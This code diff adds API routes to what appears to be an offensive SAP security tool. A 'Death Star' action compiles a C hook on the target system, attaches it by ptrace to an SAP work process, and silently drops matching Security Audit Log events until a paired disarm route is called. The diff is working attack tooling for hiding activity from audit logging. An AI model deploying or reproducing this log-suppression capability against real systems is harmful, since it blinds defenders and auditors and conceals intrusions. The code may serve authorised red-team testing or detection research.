@@ -8076,6 +8076,120 @@ def create_app(api: SAPMAPApi) -> Bottle:
              f"Tier 3: DBTABLOG purge ({hold_seconds}s)", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/tier3_sal_death_star_launch",
+                method="POST")
+    def node_tier3_sal_death_star_launch(sid):
+        """Tier 3 mutation — Virtual SAP Death Star.  Deploy Julian
+        Petersohn's sap_audit_hook.c on the target as <sid>adm,
+        compile it, find a disp+work worker PID, and launch in
+        --suppress mode.  From that point on every SAL event matching
+        the operator's filter is silently dropped in-memory across
+        fwrite / write_event_to_DB / EtdSendEvent.  Persists as a
+        background process on the target until the paired Disarm
+        action is invoked.  Requires <sid>adm shell access via any
+        available OS-exec channel and Linux ptrace_scope <= 1.
+        Refuses unless --allow-evasion is armed."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        data = request.json or {}
+        filter_classes = str(data.get("filter_classes") or "").strip()
+        # Accept operator-supplied PID (skip auto-worker-pick) or empty.
+        target_pid_raw = data.get("target_pid")
+        target_pid = None
+        if target_pid_raw not in (None, "", 0, "0"):
+            try:
+                target_pid = int(target_pid_raw)
+            except (TypeError, ValueError):
+                return json.dumps({
+                    "error": f"target_pid must be int, "
+                             f"got {target_pid_raw!r}"})
+        skip_upload = bool(data.get("skip_upload", False))
+        skip_compile = bool(data.get("skip_compile", False))
+        verbose = bool(data.get("verbose", False))
+
+        def _run():
+            try:
+                from sapmap_evasion_tier3 import (
+                    tier3_sal_death_star_launch)
+            except Exception as e:
+                print(f"[-] {sid}: tier3 death-star module "
+                      f"unavailable: {e}")
+                return
+            scope = (f"filter={filter_classes}"
+                     if filter_classes else "all SAL classes")
+            print(f"[*] {sid}: Tier 3 Death Star — arming "
+                  f"({scope}, PID={target_pid or 'auto'})")
+            out = tier3_sal_death_star_launch(
+                api.state, node,
+                filter_classes=filter_classes,
+                target_pid=target_pid,
+                skip_upload=skip_upload,
+                skip_compile=skip_compile,
+                verbose=verbose,
+            )
+            if not out.get("ok"):
+                print(f"[-] {sid}: Death Star arm failed — "
+                      f"{out.get('error')}")
+                emit_finding("WARNING", sid,
+                              f"Tier 3 Death Star arm failed: "
+                              f"{out.get('error')}")
+                return
+            print(f"[+] {sid}: Death Star armed — hook PID "
+                  f"{out.get('hook_pid')} → worker PID "
+                  f"{out.get('target_pid')} "
+                  f"({out.get('target_comm', '?')}); log at "
+                  f"{out.get('log_path')}")
+
+        _bg(f"{sid}:tier3_sal_death_star_launch",
+             f"Tier 3: Death Star arm "
+             f"({filter_classes or 'all'})", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/tier3_sal_death_star_stop",
+                method="POST")
+    def node_tier3_sal_death_star_stop(sid):
+        """Tier 3 disarm — SIGTERM the death-star hook.  The hook's
+        SIGTERM handler runs detach_all() which restores every INT3
+        byte in the target disp+work text segment and releases ptrace.
+        Idempotent: safe to call when no hook is running."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            try:
+                from sapmap_evasion_tier3 import (
+                    tier3_sal_death_star_stop)
+            except Exception as e:
+                print(f"[-] {sid}: tier3 death-star module "
+                      f"unavailable: {e}")
+                return
+            print(f"[*] {sid}: Tier 3 Death Star — disarming")
+            out = tier3_sal_death_star_stop(api.state, node)
+            if not out.get("ok"):
+                # ok=False includes "nothing to stop" (benign) and
+                # "SIGTERM sent but did not exit" (concerning).  Look
+                # at the message to decide the log level.
+                msg = out.get("message", out.get("error", ""))
+                if "nothing to stop" in msg or "no hook" in msg:
+                    print(f"[*] {sid}: {msg}")
+                else:
+                    print(f"[-] {sid}: Death Star disarm issue — "
+                          f"{msg}")
+                    emit_finding("WARNING", sid,
+                                  f"Tier 3 Death Star disarm issue: "
+                                  f"{msg}")
+                return
+            print(f"[+] {sid}: Death Star disarmed — hook PID "
+                  f"{out.get('hook_pid')} stopped cleanly")
+
+        _bg(f"{sid}:tier3_sal_death_star_stop",
+             "Tier 3: Death Star disarm", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/probe_rsau_dyn_profile", method="POST")
     def node_probe_rsau_dyn_profile(sid):
         """Phase 3 step 1 — read RSAU_API_GET_PROFILE for ID_NAME='$DYN$'
